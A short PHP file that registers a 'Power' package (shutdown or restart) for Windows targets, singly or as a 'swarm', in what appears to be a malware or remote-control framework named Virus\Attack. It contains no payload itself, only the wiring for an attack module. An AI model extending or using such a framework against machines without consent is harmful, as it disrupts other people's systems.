<?php

use Kelvinho\Virus\Attack\Classes;
use Kelvinho\Virus\Attack\PackageRegistrar;

PackageRegistrar::register("win.oneTime.Power", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\Power\\Power", "easy.Power", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Power-related operations: shutdown or restart");